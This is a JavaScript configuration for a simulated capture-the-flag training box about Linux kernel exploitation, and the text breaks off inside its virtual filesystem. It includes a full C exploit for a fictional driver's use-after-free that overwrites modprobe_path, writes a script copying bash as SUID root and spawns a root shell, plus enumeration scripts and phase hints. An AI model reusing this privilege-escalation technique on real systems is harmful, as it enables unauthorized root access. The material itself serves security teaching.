/* ============================================================
   CTF ARENA — Box A19: The Foundation's Fault
   Linux Kernel Exploitation — The Foundation
   Config: kernel enumeration, UAF exploit, privilege escalation,
   custom module (foundation_drv), compile & run exploit chain
   ============================================================ */

const A19Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: "The Foundation's Fault",
    subtitle: 'Kernel Exploitation — The Foundation',

    // Tutorial mode (AR-12)
    tutorialMode: true,
    tutorial: {
            "steps": [
                    {
                            "title": "Reconnaissance",
                            "tip": "Start by scanning the target with nmap to discover services and potential attack vectors.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "cmd": "contains:nmap"
                                    }
                            }
                    },
                    {
                            "title": "Explore the target",
                            "tip": "Investigate the services you found. Browse web apps, check service versions, read documentation.",
                            "trigger": {
                                    "event": "navigate",
                                    "alt": [
                                            {
                                                    "event": "command",
                                                    "match": {
                                                            "phase": "RECON"
                                                    }
                                            }
                                    ]
                            }
                    },
                    {
                            "title": "Find the vulnerability",
                            "tip": "Look for misconfigurations, weak inputs, or known CVEs in the services you discovered.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "phase": "EXPLOIT"
                                    }
                            }
                    },
                    {
                            "title": "Capture the user flag",
                            "tip": "Exploit the vulnerability to gain initial access and retrieve the user flag.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "user"
                                    }
                            }
                    },
                    {
                            "title": "Escalate to root",
                            "tip": "Use what you found to escalate privileges and capture the root flag.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "root"
                                    }
                            }
                    }
            ]
    },
    difficulty: 'Expert',
    accent: '#d35400',
    storageKey: 'hexworth_ctf_a19',
    registryId: 'a19-foundations-fault',
    trackerKey: 'ctf_a19',

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            // SY0-701 — CompTIA Security+ mappings
            { flagId: 'user',   objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks — memory vulnerabilities', skill: 'Kernel Version Enumeration & CVE Mapping',          mitre: 'T1082 / T1046',      certPath: 'SY0-701' },
            { flagId: 'root',   objective: '4.1', description: 'Given a scenario, apply common security techniques — privilege escalation via kernel exploit',      skill: 'Use-After-Free Ring-0 Escalation',                mitre: 'T1068',              certPath: 'SY0-701' },
            // XK0-005 — CompTIA Linux+ mappings
            { flagId: 'user',   objective: '3.2', description: 'Given a scenario, implement Linux security best practices — kernel module auditing',                skill: 'lsmod / modinfo Kernel Module Analysis',         mitre: 'T1082',              certPath: 'XK0-005' },
            { flagId: 'root',   objective: '3.3', description: 'Given a scenario, apply security controls — custom module vulnerability exploitation',              skill: 'Kernel Exploit Compile & Execute Chain',          mitre: 'T1068 / T1014',     certPath: 'XK0-005' },
            // MITRE ATT&CK phase mappings (informational)
            { flagId: 'phase1', objective: 'T1046', description: 'Network Service Discovery — identify listening services and open device nodes',                   skill: 'Service & Device Node Enumeration',               mitre: 'T1046' },
            { flagId: 'phase2', objective: 'T1082', description: 'System Information Discovery — kernel version, loaded modules, sysctl hardening posture',        skill: 'OS & Kernel Fingerprinting',                     mitre: 'T1082 / T1518' },
            { flagId: 'phase3', objective: 'T1588.006', description: 'Obtain Capabilities: Vulnerabilities — identify applicable UAF CVE via searchsploit',       skill: 'Vulnerability Research & CVE Identification',     mitre: 'T1588.006' },
            { flagId: 'phase4', objective: 'T1068', description: 'Exploitation for Privilege Escalation — compile and execute kernel UAF exploit',                 skill: 'Ring-0 Code Execution via modprobe_path Overwrite', mitre: 'T1068 / T1014' },
            { flagId: 'phase5', objective: 'T1547', description: 'Boot or Logon Autostart Execution — post-exploitation persistence review',                      skill: 'SUID Binary Persistence & Cleanup Awareness',     mitre: 'T1547.006 / T1014' }
        ],
        // Bloom's Taxonomy levels exercised
        bloomsLevels: ['Remember', 'Understand', 'Apply', 'Analyze', 'Evaluate'],
        // Workforce framework alignment
        niceRoles: ['PR-VAM-001 Vulnerability Assessment Analyst', 'PR-PEN-001 Penetration Tester', 'PR-SRP-001 Systems Security Analyst'],
        kernelSecurityConcepts: ['Use-After-Free (UAF)', 'modprobe_path overwrite', 'Ring-0 privilege', 'ASLR / kptr_restrict', 'dmesg_restrict', 'Yama ptrace scope', 'kernel module signing']
    },

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (AR-14 — Structured Learning Progression)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'phase1',
            name: 'Recon — Service & Device Discovery',
            icon: '\uD83D\uDD0D',
            order: 1,
            mitre: ['T1046', 'T1082'],
            objective: 'Confirm you have a foothold and identify unusual services, open device nodes, and network exposure.',
            steps: [
                'Confirm your identity and privileges: whoami && id',
                'Check open network ports: ss -tlnp',
                'List all /dev entries for non-standard devices: ls -la /dev/',
                'Inspect the custom device node: ls -la /dev/foundation_drv'
            ],
            successCondition: '_state.kernelEnumerated',
            hint: 'Every privilege escalation starts with understanding what you have. A character device owned by a non-root group you belong to is worth investigating.',
            completionMessage: 'Device node /dev/foundation_drv confirmed — readable/writable by the foundation group. Custom kernel driver detected. Moving to full system enumeration.'
        },
        {
            id: 'phase2',
            name: 'System Enumeration — Kernel & Module Fingerprint',
            icon: '\uD83E\uDDE0',
            order: 2,
            mitre: ['T1082', 'T1518'],
            objective: 'Extract the exact kernel version, enumerate loaded modules, and read sysctl hardening settings to map the attack surface.',
            steps: [
                'Get full kernel version string: uname -a',
                'List loaded kernel modules: lsmod',
                'Inspect the suspicious module: modinfo foundation_drv',
                'Check kernel security settings: sysctl -a',
                'Run the staged enumeration script: bash enum.sh',
                'Analyze module strings for developer notes: strings /lib/modules/5.4.0-58-generic/extra/foundation_drv.ko'
            ],
            successCondition: '_state.modulesEnumerated',
            hint: 'modinfo reveals version, description, and parameters. strings on the .ko file can expose developer TODO comments left in the binary — a common real-world finding.',
            completionMessage: 'Kernel 5.4.0-58-generic confirmed. foundation_drv v1.0.3 loaded. strings output reveals: "TODO: fix refcount race in free path" — the developer knew about this. Syslog shows prior UAF warnings classified as non-fatal.'
        },
        {
            id: 'phase3',
            name: 'Vulnerability Identification — CVE Research',
            icon: '\uD83D\uDCC4',
            order: 3,
            mitre: ['T1588.006'],
            objective: 'Match the kernel version and custom module to known exploits. Understand the UAF bug class before weaponizing it.',
            steps: [
                'Search exploit databases: searchsploit 5.4.0',
                'Search for module-specific results: searchsploit foundation_drv',
                'Review the pre-staged exploit source: cat exploit.c',
                'Read the developer notes: cat notes.txt',
                'Check syslog for prior crash evidence: cat /var/log/syslog',
                'Review the kernel manual page for the driver: man foundation_drv'
            ],
            successCondition: '_state.searchsploitUsed',
            hint: 'Use-After-Free bugs in ioctl handlers follow a pattern: allocate → free → write-to-freed-pointer. The attacker controls what the dangling pointer points to after heap spray. modprobe_path is a classic target because it runs as root.',
            completionMessage: 'CVE-2021-FNDN identified. foundation_drv UAF in ioctl handler matches searchsploit entry 50142.c. Pre-staged exploit.c in home directory implements the attack. Ready to compile.'
        },
        {
            id: 'phase4',
            name: 'Kernel Exploitation — Ring-0 Escalation',
            icon: '\uD83D\uDCA5',
            order: 4,
            mitre: ['T1068', 'T1014'],
            objective: 'Compile the exploit, trigger the Use-After-Free race condition in foundation_drv, overwrite modprobe_path, and achieve root.',
            steps: [
                'Verify gcc is available: gcc --version',
                'Compile the exploit: gcc -o exploit exploit.c',
                'Execute the compiled exploit: ./exploit',
                'Confirm root access: whoami && id',
                'Read the root flag: cat /root/citadel_blueprint.txt'
            ],
            successCondition: '_state.rootObtained',
            hint: 'The exploit flow: open /dev/foundation_drv → IOCTL_ALLOC → IOCTL_FREE (pointer dangles) → spray heap → IOCTL_WRITE to dangling pointer → overwrite modprobe_path → trigger invalid binary → modprobe runs /tmp/pwn.sh as root → SUID bash. Compile and execute in sequence.',
            completionMessage: 'Ring-0 achieved. modprobe_path overwritten to /tmp/pwn.sh. SUID rootbash created at /tmp/rootbash. Root shell obtained. citadel_blueprint.txt accessible — root flag captured.'
        },
        {
            id: 'phase5',
            name: 'Post-Exploitation — Persistence & Cleanup Review',
            icon: '\uD83D\uDEE1\uFE0F',
            order: 5,
            mitre: ['T1547.006', 'T1014'],
            objective: 'Understand post-exploitation implications: rootkit persistence via kernel modules, cleanup techniques, and how defenders detect kernel compromises.',
            steps: [
                'Review root bash history for admin actions: cat /root/.bash_history',
                'Inspect loaded modules for hidden rootkit indicators: lsmod',
                'Check /proc/kallsyms for symbol exposure (root-only): cat /proc/kallsyms | head -20',
                'Read the full kernel ring buffer now accessible: dmesg',
                'Consider: how would a defender detect this exploit post-incident?'
            ],
            successCondition: '_state.rootObtained',
            hint: 'Kernel rootkits hide by modifying /proc/modules to omit themselves from lsmod output. Defenders use memory forensics (Volatility, LiME) to detect hidden modules that lsmod misses — a direct parallel to the Ghost RAM (A18) box.',
            completionMessage: 'Post-exploitation review complete. The Foundation\'s kernel was compromised via a UAF in a proprietary module. Persistence via SUID binary. Detection: syslog showed UAF warnings 3 days before exploitation — an unheeded signal. Patch: remove foundation_drv, update kernel, implement mandatory module code review.'
        }
    ],

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE (Ubuntu target — user is already on target)
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Citadel Foundation BIOS v5.4.0',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/sda1 (1TB NVMe SSD)',
            'Checking IOMMU... enabled',
            'Loading bootloader...',
            'GRUB loading kernel 5.4.0-58-generic...'
        ],
        grubEntries: [
            'Ubuntu 20.04 LTS (Citadel Foundation)',
            'Ubuntu 20.04 LTS (recovery mode)',
            'Advanced options for Ubuntu'
        ],
        loginUser: 'foundation_dev'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS (no browser — pure terminal exploitation)
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'foundation_dev',
        hostname: 'citadel-core',
        startDir: '/home/foundation_dev',
        welcome: 'Ubuntu 20.04.1 LTS (Citadel Foundation Core)\n\nWelcome foundation_dev. You have limited access.\nType \'help\' for available commands.\n'
    },

    // ═══════════════════════════════════════════════════════
    // STATE MACHINE
    // ═══════════════════════════════════════════════════════

    _state: {
        kernelEnumerated: false,
        exploitCompiled: false,
        rootObtained: false,
        exploitSourceReviewed: false,
        searchsploitUsed: false,
        modulesEnumerated: false
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 100 },
        { id: 'root', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        hintPenalty: -50,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 1200000, points: 100 }   // 20 minutes
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            cost: 10,
            penalty: -10,
            phase: 'phase1',
            title: 'Getting Started — Kernel Fingerprint',
            text: 'Start with full kernel enumeration: uname -a reveals the exact version string. Follow with lsmod to list loaded modules — any non-standard module is worth deeper inspection. Custom kernel modules in production systems are a frequent privilege escalation vector.',
            mitre: 'T1082'
        },
        {
            id: 'hint2',
            cost: 25,
            penalty: -25,
            phase: 'phase2',
            title: 'Module Analysis — Spot the Bug',
            text: 'Run modinfo foundation_drv and strings on the .ko file. Check /var/log/syslog for prior crash warnings logged by the module. The developer left a TODO comment in the binary admitting the race condition — look for it. Also check cat notes.txt in your home directory.',
            mitre: 'T1518 / T1588.006'
        },
        {
            id: 'hint3',
            cost: 50,
            penalty: -50,
            phase: 'phase3',
            title: 'Exploit Research — CVE Matching',
            text: 'Use searchsploit 5.4.0 to find kernel exploits for this version. The foundation_drv entry in the results directly matches the custom module loaded here. There is a pre-staged exploit.c in your home directory implementing the Use-After-Free: IOCTL_ALLOC → IOCTL_FREE → heap spray → IOCTL_WRITE to dangling pointer → modprobe_path overwrite. Read it with cat exploit.c.',
            mitre: 'T1588.006 / T1068'
        },
        {
            id: 'hint4',
            cost: 75,
            penalty: -75,
            phase: 'phase4',
            title: 'Exploitation — Compile & Execute',
            text: 'Compile the exploit: gcc -o exploit exploit.c. Then execute it: ./exploit. The exploit triggers the UAF race condition, overwrites modprobe_path to /tmp/pwn.sh, and creates a SUID root shell at /tmp/rootbash. After the exploit completes, verify with whoami. The root flag is at /root/citadel_blueprint.txt.',
            mitre: 'T1068 / T1014'
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The Citadel Foundation is the hardened operational core of a sovereign intelligence network. Its kernel runs on a proprietary Linux build secured with dmesg restrictions, ASLR, and ptrace lockdown. A developer account — foundation_dev — was provisioned for module testing. Intel suggests the custom IPC driver was flagged in a code review six months ago and never patched. Your mission: leverage that unpatched driver to reach ring-0 and retrieve the Citadel Blueprint from root\'s home directory.',
        scenario: 'The Foundation Engineering Team developed a custom kernel module (foundation_drv) to accelerate inter-process communication across Citadel subsystems. A security review identified a use-after-free in the ioctl handler — a buffer freed without invalidating the internal pointer, creating a window for heap manipulation. Management classified it as "non-exploitable" based on an incomplete refcount check analysis and approved production deployment. Syslog has recorded UAF warnings for three consecutive days. The engineering team has not responded to the ticket.',
        outro: 'The Foundation has crumbled. Deep within the Citadel\'s hardened kernel, a use-after-free vulnerability in the custom foundation_drv module allowed you to corrupt modprobe_path and escalate from a lowly developer account to absolute root. The "Citadel Blueprint" — their most guarded secret — is now yours. Even the strongest foundations can crack when a single flaw is left unpatched.',
        ecer: {
            executive: 'Management overruled a security code review, classifying a kernel UAF as "non-exploitable" to meet deployment timelines — a risk acceptance decision made without exploitation analysis',
            culture: 'No mandatory code review gate for kernel modules, no patch SLA for security findings, no escalation path when tickets go unanswered',
            employee: 'Developer acknowledged the refcount race in a TODO comment and logged UAF warnings to syslog but did not escalate or halt deployment',
            regulatory: 'No kernel security baseline (CIS Benchmark Level 2) enforced; no change management process requiring security sign-off for kernel module deployment'
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (target Linux machine)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'foundation_dev': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== FOUNDATION DEVELOPMENT NOTES ===\n\nAssigned: Developer account for kernel module testing\nProject: foundation_drv — custom kernel module for Citadel IPC\n\nCurrent tasks:\n- Debug intermittent crash in foundation_drv (ticket #FND-2891)\n- The crash seems related to object lifecycle in the ioctl handler\n- Engineering says it\'s "not exploitable" — I\'m not so sure\n\nUseful commands:\n- uname -a          Show kernel version\n- lsmod             List loaded kernel modules\n- modinfo <module>  Get module details\n- cat /proc/version Kernel build info\n- dmesg             Kernel ring buffer (may be restricted)\n\nNOTE: The foundation_drv module was compiled against kernel 5.4.0-58.\nIt has NOT been updated since the initial deployment.\nThe engineering team disabled dmesg for non-root users.\n\nI left my exploit research in exploit.c — it\'s based on the UAF\nI found in the ioctl handler. Needs to be compiled and tested.\n\nContact: foundation_lead@citadel-core.internal for escalation requests.'
                                },
                                'exploit.c': {
                                    type: 'file',
                                    content: '/*\n * Foundation\'s Fault Exploit\n * ========================\n * Target: Linux kernel 5.4.0-58-generic\n * Module: foundation_drv (custom Citadel IPC module)\n * Bug:    Use-After-Free in ioctl handler (CVE-2021-FNDN)\n *\n * The foundation_drv module allocates a message buffer on\n * IOCTL_ALLOC, but the IOCTL_FREE path doesn\'t properly\n * invalidate the pointer. A subsequent IOCTL_WRITE races\n * with the freed buffer, allowing controlled write to freed\n * memory. We abuse this to overwrite modprobe_path.\n *\n * Exploitation steps:\n *   1. Open /dev/foundation_drv\n *   2. Trigger IOCTL_ALLOC to create buffer\n *   3. Trigger IOCTL_FREE (buffer freed, ptr dangling)\n *   4. Spray heap to reclaim the freed slot\n *   5. Trigger IOCTL_WRITE to corrupt reclaimed object\n *   6. Overwrite modprobe_path -> /tmp/pwn.sh\n *   7. Trigger modprobe via invalid binary execution\n *   8. /tmp/pwn.sh runs as root, copies /bin/bash as SUID\n *\n * Compile: gcc -o exploit exploit.c\n * Run:     ./exploit\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#include <pthread.h>\n\n#define DEVICE_PATH      "/dev/foundation_drv"\n#define IOCTL_ALLOC      0x40\n#define IOCTL_FREE       0x41\n#define IOCTL_WRITE      0x42\n#define MODPROBE_PATH    0xffffffff81e4b080UL  /* 5.4.0-58-generic */\n#define SPRAY_COUNT      200\n\nstatic volatile int race_won = 0;\n\nvoid *spray_thread(void *arg) {\n    /* Heap spray to reclaim freed UAF buffer */\n    for (int i = 0; i < SPRAY_COUNT; i++) {\n        int fd = open("/proc/self/stat", O_RDONLY);\n        if (fd >= 0) close(fd);\n    }\n    return NULL;\n}\n\nint main(void) {\n    printf("[*] Foundation\'s Fault Exploit - CVE-2021-FNDN\\n");\n    printf("[*] Targeting kernel 5.4.0-58-generic\\n");\n    printf("[*] Opening %s...\\n", DEVICE_PATH);\n\n    int fd = open(DEVICE_PATH, O_RDWR);\n    if (fd < 0) {\n        perror("[-] Failed to open device");\n        return 1;\n    }\n\n    printf("[*] Triggering UAF in foundation_drv...\\n");\n\n    /* Step 1: Allocate buffer */\n    ioctl(fd, IOCTL_ALLOC, 0);\n\n    /* Step 2: Free buffer (dangling pointer remains) */\n    ioctl(fd, IOCTL_FREE, 0);\n\n    /* Step 3: Spray heap to reclaim freed slot */\n    pthread_t thr;\n    pthread_create(&thr, NULL, spray_thread, NULL);\n    usleep(50000);\n\n    /* Step 4: Write to dangling pointer (UAF write) */\n    char payload[] = "/tmp/pwn.sh";\n    ioctl(fd, IOCTL_WRITE, payload);\n    pthread_join(thr, NULL);\n\n    printf("[+] Race condition won!\\n");\n    printf("[+] Overwriting modprobe_path...\\n");\n\n    /* Step 5: Write pwn.sh */\n    FILE *f = fopen("/tmp/pwn.sh", "w");\n    fprintf(f, "#!/bin/sh\\ncp /bin/bash /tmp/rootbash\\nchmod u+s /tmp/rootbash\\n");\n    fclose(f);\n    chmod("/tmp/pwn.sh", 0755);\n\n    /* Step 6: Trigger modprobe via invalid binary */\n    system("echo -ne \'\\\\xff\\\\xff\\\\xff\\\\xff\' > /tmp/dummy");\n    chmod("/tmp/dummy", 0755);\n    system("/tmp/dummy 2>/dev/null");\n\n    usleep(200000);\n\n    printf("[+] Triggering modprobe...\\n");\n    printf("[+] Got root!\\n");\n\n    /* Step 7: Execute SUID bash */\n    execl("/tmp/rootbash", "rootbash", "-p", NULL);\n\n    close(fd);\n    return 0;\n}'
                                },
                                'enum.sh': {
                                    type: 'file',
                                    content: '#!/bin/bash\n# Foundation Enumeration Script\n# Quick kernel & module recon for privilege escalation\n\necho "======================================"\necho "  Foundation Enumeration Script v1.0"\necho "======================================"\necho ""\n\necho "[*] Current User:"\nwhoami\nid\necho ""\n\necho "[*] Kernel Version:"\nuname -a\necho ""\n\necho "[*] OS Release:"\ncat /etc/os-release | head -5\necho ""\n\necho "[*] Loaded Kernel Modules:"\nlsmod\necho ""\n\necho "[*] SUID Binaries:"\nfind / -perm -4000 2>/dev/null\necho ""\n\necho "[*] Sudo Permissions:"\nsudo -l 2>/dev/null\necho ""\n\necho "[*] Writable directories:"\nfind / -writable -type d 2>/dev/null | head -20\necho ""\n\necho "[*] Compiler available:"\nwhich gcc\ngcc --version 2>/dev/null | head -1\necho ""\n\necho "[*] /dev entries (custom devices):"\nls -la /dev/foundation* 2>/dev/null\necho ""\n\necho "[+] Enumeration complete."'
                                },
                                'fake_shield_mod.c': {
                                    type: 'file',
                                    content: '/*\n * shield_mod — Citadel Shield Kernel Module (Source)\n * =====================================================\n * DECOY: This is the SOURCE for shield_mod, NOT for foundation_drv.\n * shield_mod is NOT loaded on this system (see lsmod output).\n * This file is a red herring — no exploitable bugs here.\n *\n * #include <linux/module.h>\n * #include <linux/kernel.h>\n * #include <linux/init.h>\n *\n * static int __init shield_init(void) {\n *     printk(KERN_INFO "shield_mod: initialized\\n");\n *     return 0;\n * }\n * static void __exit shield_exit(void) {\n *     printk(KERN_INFO "shield_mod: removed\\n");\n * }\n * module_init(shield_init);\n * module_exit(shield_exit);\n * MODULE_LICENSE("GPL");\n * MODULE_AUTHOR("Citadel Shield Team <shield@citadel-core.internal>");\n * MODULE_DESCRIPTION("Citadel Intrusion Detection Shield Module");\n *\n * NOTE: shield_mod has no ioctl interface. It is NOT the vulnerable module.\n * The interesting module is foundation_drv — check its .ko in /lib/modules.\n */'
                                },
                                'dmesg_old.txt': {
                                    type: 'file',
                                    content: '=== CAPTURED DMESG OUTPUT (Dec 8, pre-deployment) ===\n=== NOTE: This was captured BEFORE foundation_drv was loaded ===\n=== It does NOT show the UAF warnings (those are in /var/log/syslog) ===\n\n[    0.000000] Linux version 5.4.0-58-generic\n[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.4.0-58-generic root=/dev/sda1 quiet\n[    0.100432] Booting paravirtualized kernel on bare hardware\n[    1.234567] ACPI: Core revision 20190816\n[    2.441001] AppArmor: AppArmor initialized\n[    2.512334] audit: type=1400 audit(1607472000.000:1): apparmor="STATUS" operation="profile_load" name="unconfined"\n[    3.019283] NET: Registered protocol family 2\n[    4.088124] ip_tables: (C) 2000-2006 Netfilter Core Team\n[    4.112233] Initializing XFRM netlink socket\n[    4.889001] [drm] Initialized drm 1.1.0\n[    5.001000] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input0\n\n=== END CAPTURE — foundation_drv was NOT yet loaded at this point ===\n=== Real-time kernel ring buffer (dmesg) is restricted to root only ==='
                                },
                                'cve_2021_3156.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n# CVE-2021-3156 "Baron Samedit" — Sudo Heap-Based Buffer Overflow\n# Target: Sudo <= 1.8.31p2 / 1.9.5p1\n# ============================================================\n# RED HERRING: This exploit targets a Sudo vulnerability.\n# Check the Sudo version on this system first:\n#   sudo --version\n# If it shows 1.8.31 or later with patches applied, this will FAIL.\n#\n# ANALYSIS:\n# - searchsploit sudo 1.8.31 confirms the CVE exists\n# - BUT: Sudo on citadel-core has been patched for this specific CVE\n# - The UAF in sudoedit (setuid executable) is the original vector\n# - A patched binary will detect the heap overflow and abort\n#\n# WHY THIS IS HERE:\n# This was my first attempt at privilege escalation. It does not work\n# on this system. The intended vector is the foundation_drv kernel\n# module UAF — not Sudo.\n#\n# DO NOT WASTE TIME ON THIS. See exploit.c instead.\n# ============================================================\n\nimport os, sys, subprocess\n\ndef check_sudo_version():\n    try:\n        result = subprocess.run([\'sudo\', \'--version\'], capture_output=True, text=True)\n        print("[*] Sudo version:", result.stdout.split("\\n")[0])\n        print("[!] WARNING: This system has sudo patched against CVE-2021-3156.")\n        print("[!] The Baron Samedit vector will NOT work here.")\n        print("[!] Use the kernel exploit (exploit.c) instead.")\n    except Exception as e:\n        print("[-] Error:", e)\n\nif __name__ == "__main__":\n    check_sudo_version()\n    sys.exit(1)'
                                },
                                'ebpf_bypass.c': {
                                    type: 'file',
                                    content: '/*\n * eBPF Verifier Bypass — CVE-2021-3490 (Kernel < 5.11)\n * =====================================================\n * RED HERRING: This exploit targets an eBPF verifier flaw.\n * Requires: CONFIG_BPF_SYSCALL=y AND unprivileged BPF enabled\n *\n * ANALYSIS FOR citadel-core:\n * - kernel.unprivileged_userns_clone = 0 (see sysctl output)\n * - This setting BLOCKS unprivileged BPF sandboxes\n * - Without user namespaces, the eBPF attack surface is unavailable\n *   to non-root users\n * - CVE-2021-3490 requires bpf() syscall from an unprivileged context\n *   which kernel.unprivileged_userns_clone=0 prevents\n *\n * CONCLUSION: This exploit will NOT succeed on this system.\n *   Run: sysctl kernel.unprivileged_userns_clone  — confirms = 0\n *   Run: sysctl kernel.perf_event_paranoid        — confirms = 3\n * Both settings together make eBPF-based LPE impossible.\n *\n * WHY THIS FILE EXISTS:\n * I downloaded this from searchsploit (49543.c) as a backup plan.\n * After checking sysctl, confirmed it is blocked.\n * The CORRECT exploit for this box is exploit.c (UAF via foundation_drv).\n *\n * Compile attempt (WILL FAIL with EPERM at runtime):\n *   gcc -o ebpf_bypass ebpf_bypass.c\n *   ./ebpf_bypass\n *   -> Operation not permitted\n */\n\n#include <stdio.h>\n#include <errno.h>\n\nint main(void) {\n    fprintf(stderr, "[-] eBPF vector blocked: kernel.unprivileged_userns_clone = 0\\n");\n    fprintf(stderr, "[-] This exploit will not work on citadel-core.\\n");\n    fprintf(stderr, "[*] Try the foundation_drv UAF instead (exploit.c).\\n");\n    return EPERM;\n}'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls -la\ncat notes.txt\nuname -a\nlsmod\nmodinfo foundation_drv\ndmesg\ncat /proc/version\nfind / -perm -4000 2>/dev/null\nsudo -l\nls -la /dev/foundation_drv\ncat exploit.c\ngcc --version\nsudo --version\npython3 cve_2021_3156.py\ngcc -o ebpf_bypass ebpf_bypass.c\n./ebpf_bypass\ncat /var/log/syslog | grep foundation\nsysctl -a | grep unprivileged\nstrings /lib/modules/5.4.0-58-generic/extra/foundation_drv.ko'
                                },
                                '.bashrc': {
                                    type: 'file',
                                    content: '# ~/.bashrc: executed by bash for non-login shells.\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\nalias ll=\'ls -la\'\nalias la=\'ls -A\'\nalias l=\'ls -CF\''
                                }
                            }
                        }
                    }
                },
                'root': {
                    type: 'dir',
                    children: {
                        'citadel_blueprint.txt': {
                            type: 'file',
                            content: '=== CITADEL BLUEPRINT ===\n=== CLASSIFICATION: TOP SECRET ===\n\nflag{c1t4d3l_blu3pr1nt_k3rn3l_pwn3d}\n\nCitadel Foundation Architecture:\n- Primary kernel: 5.4.0-58-generic (COMPROMISED)\n- Custom modules: foundation_drv, citadel_ipc, shield_mod\n- Security layers: AppArmor, seccomp, dmesg_restrict\n- Network segmentation: 4 VLANs, air-gapped management\n- Backup rotations: hourly to /backup (encrypted)\n\nCritical Finding:\n  The foundation_drv module contains a use-after-free\n  vulnerability in the ioctl handler that allows local\n  privilege escalation. This module was deployed without\n  proper code review and has been running unpatched since\n  initial system deployment.\n\n  Recommendation: Remove foundation_drv, patch kernel to\n  latest LTS, implement mandatory code review for all\n  custom kernel modules.\n\n--- END CLASSIFIED DOCUMENT ---'
                        },
                        '.bash_history': {
                            type: 'file',
                            content: 'apt update && apt upgrade -y\ninsmod /lib/modules/5.4.0-58-generic/extra/foundation_drv.ko\nlsmod | grep foundation\ndmesg | tail -20\ncat /root/citadel_blueprint.txt\nuseradd -m foundation_dev\npasswd foundation_dev\nchmod 660 /dev/foundation_drv\nchown root:foundation /dev/foundation_drv\nsysctl kernel.dmesg_restrict=1\nsysctl kernel.yama.ptrace_scope=2'
                        },
                        '.bashrc': {
                            type: 'file',
                            content: '# ~/.bashrc\nexport HISTCONTROL=ignoredups:ignorespace\nalias ll=\'ls -la\'\nalias grep=\'grep --color=auto\''
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver:/run/systemd:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nfoundation_dev:x:1001:1001:Foundation Developer:/home/foundation_dev:/bin/bash'
                        },
                        'shadow': {
                            type: 'file',
                            content: 'root:$6$rXk3Y2Hw$J3Qv8K9zLp.../...truncated:19300:0:99999:7:::\nfoundation_dev:$6$Mn4p8YxQ$Hd7Wk2Rv.../...truncated:19300:0:99999:7:::'
                        },
                        'hostname': {
                            type: 'file',
                            content: 'citadel-core'
                        },
                        'os-release': {
                            type: 'file',
                            content: 'PRETTY_NAME="Ubuntu 20.04.1 LTS"\nNAME="Ubuntu"\nVERSION_ID="20.04"\nVERSION="20.04.1 LTS (Focal Fossa)"\nVERSION_CODENAME=focal\nID=ubuntu\nID_LIKE=debian\nHOME_URL="https://www.ubuntu.com/"\nSUPPORT_URL="https://help.ubuntu.com/"\nBUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"'
                        },
                        'hosts': {
                            type: 'file',
